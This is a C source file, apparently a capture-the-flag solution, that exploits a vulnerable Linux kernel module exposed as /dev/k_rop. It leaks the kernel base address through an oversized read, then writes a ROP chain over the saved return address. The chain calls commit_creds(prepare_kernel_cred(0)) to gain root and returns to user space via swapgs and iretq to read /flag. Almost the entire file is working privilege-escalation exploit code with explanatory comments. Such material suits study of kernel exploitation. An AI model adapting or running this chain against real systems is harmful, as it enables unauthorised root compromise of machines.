// Device k_rop.ko copies information from kernel space to user space, so we can leak the kernel base and use it to build a ROP chain to get root privileges

#include <stdlib.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

#define SIZE 0x200

// Function addresses got from ida
#define KERNEL_BASE 0Xffffffff81000000
#define OFF_PREPARE_KERNEL_CREDS (0xffffffff81094670 - KERNEL_BASE)
#define OFF_COMMIT_CREDS (0xffffffff810943d0 - KERNEL_BASE)

// offset of the real kernel base w.r.t. the one got in ida (offset computed by subtracting the base address from the leak in the buffer buff, not got from gdb because the latter gives the ret address of the read)
#define LEAK_OFFSET 0x201532

// Gadgets
#define OFF_POP_RDI_RET (0xffffffff810031c4 - KERNEL_BASE)
#define OFF_MOV_RCX_RAX (0xffffffff814489f4 - KERNEL_BASE)
#define OFF_MOV_RDI_RCX (0xffffffff810e8134 - KERNEL_BASE)  // Also performs sub rdi, rcx; so rdx must be set to 0 before calling this gadget. Other thing, it performs add rsp, 8; so it moves the rsp 8 Bytes above
#define OFF_POP_RDX_RET (0xffffffff81051398 - KERNEL_BASE)
#define OFF_SWAPGS_RET (0xffffffff81c14530 - KERNEL_BASE)
#define OFF_IRETQ (0xffffffff8102c61b - KERNEL_BASE)

// cs, rsp and ss are C keywords, so we cannot use them directly as variable names
unsigned long long cs_user, rflags, rsp_user, ss_user;

// Moving register values to variables to save them for iretq
// We do not want to directly call this funct because that way we would change the ret address, so we tell the compiler to directly put its code inside the main funct
void get_regs()
{
    asm volatile(
        "mov %0, cs;\n"
        "mov %1, rsp;\n"
        "mov %2, ss;\n"
        "pushf;\n"
        "pop %3;\n"
        : "=r"(cs_user), "=r"(rsp_user), "=r"(ss_user), "=r"(rflags)
        :
        :
    );
}

void win()
{
    int fd = open("/flag", O_RDONLY);
    char buf[0x100] = {0};

    read(fd, buf, 0x100);
    close(fd);
    write(STDOUT_FILENO, buf, 0x100);   // Not calling printf or puts because they could change the ret addr
    exit(0);
}

int main(int argc, char* argv[])
{
    char buff[SIZE];
    int fd, i;
    unsigned long long *ptr = (unsigned long long *)buff;
    unsigned long long kernel_base;

    fd = open("/dev/k_rop", O_RDWR);    // Open the device file

    if (fd < 0)
    {
        perror("open");
        return 1;
    }

    // Leaking stuff by reading /proc/k_rop (run information about the program, in this case the baby kernel module k_rop)
    read(fd, buff, SIZE);      // Not too much, otherwise we would overflow the stack, making the kernel panic

    for (i = 0; i < SIZE / 8; i++)
        printf("%03d) 0x%llx\n", i, ptr[i]);

    get_regs();

    // We saw that the return address to the kernel is at position 33 of the buffer, so we can get the kernel base by subtracting the offset leaked before
    kernel_base = ptr[33] - LEAK_OFFSET;
    printf("Kernel base: 0x%llx\n", kernel_base);
    printf("ROP CHAIN START: 0x%llx\n", kernel_base + OFF_POP_RDI_RET);
    printf("After perpare_kernel_creds: 0x%llx\n", kernel_base + OFF_MOV_RCX_RAX);
    printf("After commit_creds: 0x%llx\n", kernel_base + OFF_COMMIT_CREDS);

    // if (argc == 2)
    // {
        // Plan: commit_creds(premare_kernel_cred(0))
        // Alt. commit_creds(init_root())
        ptr[33] = kernel_base + OFF_POP_RDI_RET;    // Gadget to put 0 into RDI
        ptr[34] = 0;                                // Preparing the 0 to be popped into RDI as the arg for prepare_kernel_creds
        ptr[35] = kernel_base + OFF_PREPARE_KERNEL_CREDS;   // Callig prepare_kernel_creds with arg 0 (root creds)

        // Now we have the pointer to the kernel creds of the root in RAX, but to call commit_kernel_creds, and become root, we have to move them to RDI. How can we do this? Simple, with many many gadgets...
        ptr[36] = kernel_base + OFF_MOV_RCX_RAX;
        ptr[37] = kernel_base + OFF_POP_RDX_RET;
        ptr[38] = 0;
        ptr[39] = kernel_base + OFF_MOV_RDI_RCX;
        ptr[40] = 0xdeadbeef;
        ptr[41] = kernel_base + OFF_COMMIT_CREDS;

        // Now we have to return to the user space, which cannot be done with a simple ret instr.
        // The instr. we are looking for is iretq, which returns to user space after an interrupt, but it needs some regs to be set before being called:
        // RIP
        // CS
        // RFLAGS
        // RSP
        // SS
        // But before performing iretq, we need to swap the space from kernel to user with swapgs
        ptr[42] = kernel_base + OFF_SWAPGS_RET;
        ptr[43] = kernel_base + OFF_IRETQ;
        ptr[44] = (unsigned long long)win;
        ptr[45] = cs_user;
        ptr[46] = rflags;
        ptr[47] = rsp_user;
        ptr[48] = ss_user;

        write(fd, buff, SIZE);
    // }
    
    close(fd);
}